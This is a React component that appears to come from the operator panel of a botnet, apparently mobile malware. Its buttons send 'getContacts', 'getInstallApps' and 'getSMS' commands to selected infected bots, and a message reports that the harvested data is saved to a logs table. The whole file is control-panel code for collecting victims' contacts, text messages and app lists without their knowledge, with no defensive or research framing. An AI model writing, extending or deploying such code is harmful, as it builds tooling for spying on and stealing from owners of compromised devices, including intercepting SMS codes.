import React from 'react';
import SettingsContext from '../../Settings';

class GetDataFromBot extends React.Component {

    constructor(props) {
        super(props);
    }

    ProcessInfo(info) {
        SettingsContext.ShowToastTitle('success', 'Success', 'Logs saved to Logs Table. Look all logs on info bot.');
    }

    onClickGetContacts = (e) => {
        SettingsContext.BotSendCommandCallBack('{"name":"getContacts"}', this.ProcessInfo);
    }

    onClickGetApps = (e) => {
        SettingsContext.BotSendCommandCallBack('{"name":"getInstallApps"}', this.ProcessInfo);
    }

    onClickGetSMS = (e) => {
        SettingsContext.BotSendCommandCallBack('{"name":"getSMS"}', this.ProcessInfo);
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Get data from bots</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Get data from selected bots</h6>
                    <div class="row">
                        <div class="col"><button type="button" onClick={this.onClickGetApps} class="btn btn-right btn-outline-success">Get installed apps</button></div>
                        <div class="col"><button type="button" onClick={this.onClickGetContacts} class="btn btn-right btn-outline-success" style={({marginRight:'15px'})}>Get contacts</button></div>
                        <div class="col"><button type="button" onClick={this.onClickGetSMS} class="btn btn-right btn-outline-success" style={({marginRight:'15px'})}>Get all SMS</button></div>
                    </div>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default GetDataFromBot;